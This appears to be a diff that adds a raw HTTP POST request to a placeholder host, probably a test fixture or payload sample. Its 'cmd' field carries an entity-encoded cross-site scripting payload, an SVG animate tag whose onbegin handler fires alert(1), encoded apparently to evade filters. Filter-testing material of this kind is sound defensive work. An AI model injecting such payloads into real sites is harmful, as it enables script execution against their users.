@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 71
+Connection: close
+
+cmd=&#x3C;svg&#x3E;&#x3C;animate onbegin=alert(1) attributeName=x&#x3E;
